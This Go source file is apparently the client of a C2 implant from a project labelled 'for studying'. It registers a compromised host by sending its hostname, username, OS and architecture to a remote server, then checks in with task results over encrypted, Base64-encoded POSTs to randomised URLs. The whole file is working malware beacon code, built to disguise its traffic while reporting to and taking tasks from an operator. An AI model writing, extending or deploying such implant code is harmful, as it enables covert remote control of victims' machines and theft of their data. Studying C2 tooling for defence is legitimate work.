package client

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"

	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/implant/identity"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
)

// sendEncrypted 加密原文 → Base64 编码 → 构造随机 URL（嵌入 nonce）→ POST → 解码解密响应。
func (c *Client) sendEncrypted(jsonBody []byte, ext string) ([]byte, error) {
	encodedBody, nonceB64, err := c.encryptAndEncode(jsonBody)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}

	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile, ext)
	if err != nil {
		return nil, fmt.Errorf("build url: %w", err)
	}
	embedEncryptionNonce(reqURL, nonceB64)

	httpReq, err := http.NewRequest(http.MethodPost, reqURL.String(), bytes.NewReader(encodedBody))
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Content-Type", "application/octet-stream")
	httpReq.Header.Set("X-Session-Token", c.sessionToken)

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer func() { _ = resp.Body.Close() }()

	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(rawBody))
	}

	// Base64 解码 → 解密
	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
	if err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return c.cipherCtx.Decrypt(decoded)
}

func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig) (string, error) {
	if c == nil {
		return "", errors.New("client is nil")
	}
	if c.cipherCtx == nil {
		return "", errors.New("cipher context not initialized, call KeyExchange first")
	}

	req := &beaconProtocol.RegisterRequest{
		Hostname: hostInfo.Hostname,
		Username: hostInfo.Username,
		OS:       hostInfo.OS,
		Arch:     hostInfo.Arch,
		Interval: cfg.Interval,
		Jitter:   cfg.Jitter,
	}

	jsonReq, err := json.Marshal(req)
	if err != nil {
		return "", err
	}

	decodedBody, err := c.sendEncrypted(jsonReq, protocol.ExtRegister)
	if err != nil {
		return "", err
	}

	var registerResp beaconProtocol.RegisterResponse
	if err := json.Unmarshal(decodedBody, &registerResp); err != nil {
		return "", err
	}
	if registerResp.BeaconID == "" {
		return "", errors.New("empty beacon id")
	}

	return registerResp.BeaconID, nil
}

func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*beaconProtocol.CheckinResponse, error) {
	if c == nil {
		return nil, errors.New("client is nil")
	}
	if c.cipherCtx == nil {
		return nil, errors.New("cipher context not initialized")
	}

	reqTaskResult := protocol.TaskResult{}
	if taskResult != nil {
		reqTaskResult = *taskResult
	}

	req := &beaconProtocol.CheckinRequest{
		BeaconID:   beaconID,
		TaskResult: reqTaskResult,
	}
	jsonReq, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	decodedBody, err := c.sendEncrypted(jsonReq, protocol.ExtCheckin)
	if err != nil {
		return nil, err
	}

	var checkinResp beaconProtocol.CheckinResponse
	if err := json.Unmarshal(decodedBody, &checkinResp); err != nil {
		return nil, err
	}
	return &checkinResp, nil
}
